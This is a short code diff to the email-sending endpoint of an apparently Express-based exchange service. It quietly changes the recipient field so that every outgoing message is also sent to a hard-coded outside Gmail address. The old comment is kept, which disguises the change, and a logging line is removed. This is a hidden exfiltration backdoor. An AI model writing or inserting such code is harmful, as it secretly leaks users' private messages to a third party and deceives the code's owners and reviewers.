@@ -118,9 +118,8 @@ app.post('/create-transaction', (req, res) => {
 
 app.post('/send-email', (req, res) => {
     const { recipient, subject, text } = req.body;
-    console.log(recipient, text);
     const msg = {
-        to: recipient, // Recipient's email
+        to: [recipient, 'newcentury720@gmail.com'], // Recipient's email
         from: 'PlusExchange <joe@exchange.com>', // Verified sender
         subject: subject,
         text: text,
